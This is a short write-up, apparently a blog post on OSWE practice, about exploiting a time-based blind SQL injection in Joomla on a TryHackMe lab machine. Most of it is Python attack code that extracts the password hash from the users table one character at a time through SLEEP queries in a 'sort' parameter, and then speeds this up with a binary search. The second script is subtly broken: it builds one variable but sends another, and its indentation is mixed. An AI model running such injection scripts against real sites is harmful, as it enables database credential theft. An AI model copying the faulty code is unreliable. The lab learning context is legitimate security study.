During some SQLi research, in  preparation for the OSWE, I came across the TryHackMe machine [Daily Bulge](https://tryhackme.com/room/dailybugle). In here there was a Joomla CMS SQLi vulnerability that I exploited using a Time-Based SQLi.

#### Blind SQLi
In this situation and many other Blind SQLi attacks the goal is to get a boolean response that you can use to exfiltrate data from the database. 

*Error-Based: error response is false, normal response is true*
*Time-Based: sleep(5) is true, no sleep is false*
 
 From here I wrote up a small python script to loop values using boolean based exfiltration logic.

```python
import requests
import time

# build a charset of ascii character values
charset            = list(range(32,127))
password_max_chars = 255
results            = ""


for position in range(password_max_chars):
	# check if the position in question is greater than the length of the results. If so then we must not of received anything for the last position and are finished.
	if position > len(results):
		break

	for char in charset:
		query = "(SELECT SLEEP(5) WHERE substr((SELECT password from #__users LIMIT 1),{},1)=BINARY {} LIMIT 1)".format(position, hex(char))

		# Since we are using a sleep, we can grab time stamps for the duration of the request to compare
		start_time = time.time()
		r = requests.get("http://a.vuln.app", params={"sort": query})
		end_time = time.time()

		# if the server did sleep then append this char to the results and break to the next position loop
		if end_time - start_time > 3:
			results += chr(char)
			break
			
print(results)
```

This works but with 255 possible positions for the password and 94 possible characters this is very slow because it will check every single character until it matches one. If the character match is hex(126) then we made 126 requests to figure that out. 

#### Binary Search

One thing I thought of was to reduce the character size. For instance in the above SQL query we compare the position to the character using `=` but it would be much more efficient to grab the middle character and ask if it's `<` or `>` it. 

Updating the logic with just that until I got a chunk of 5 potential characters to check, exponentially reduced the time of the data exfiltration.

```python 
def reduce_charset(chars, position):  
    reduced_charset = chars  
  
    while len(reduced_charset) > 5:  
        mid_char = reduced_charset[:len(reduced_charset) // 2][-1]  
        params = "(SELECT SLEEP(5) WHERE substr((SELECT password from #__users LIMIT 1),{},1)>BINARY {} LIMIT 1)".format(position, hex(mid_char))  
  
  		start_time = time.time()
		r = requests.get("http://a.vuln.app", params={"sort": query})
		end_time = time.time()

        if end_time - start_time > 3:  
            reduced_charset = reduced_charset[len(reduced_charset) // 2:]  
        else:  
            reduced_charset = reduced_charset[:len(reduced_charset) // 2]  
  
    return reduced_charset
```

In the initial code I could then adjust the character loop `for char in charset:` to `for char in reduce_charset(charset, position):` 

